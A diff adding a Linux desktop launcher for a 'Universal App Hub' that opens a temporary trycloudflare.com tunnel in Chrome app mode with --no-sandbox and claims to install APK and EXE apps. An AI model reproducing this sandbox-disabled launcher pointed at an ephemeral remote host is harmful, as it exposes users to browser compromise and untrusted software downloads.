@@ -1,0 +1,10 @@
+[Desktop Entry]
+Version=1.0
+Type=Application
+Name=Universal App Hub
+Comment=Download & Install APK, EXE, Windows and Linux Apps
+Exec=google-chrome --app="https://evaluating-twin-county-meditation.trycloudflare.com/#appstore" --no-sandbox --disable-dev-shm-usage
+Icon=/usr/share/icons/virgox/apphub.svg
+Terminal=false
+StartupNotify=true
+Categories=System;PackageManager;
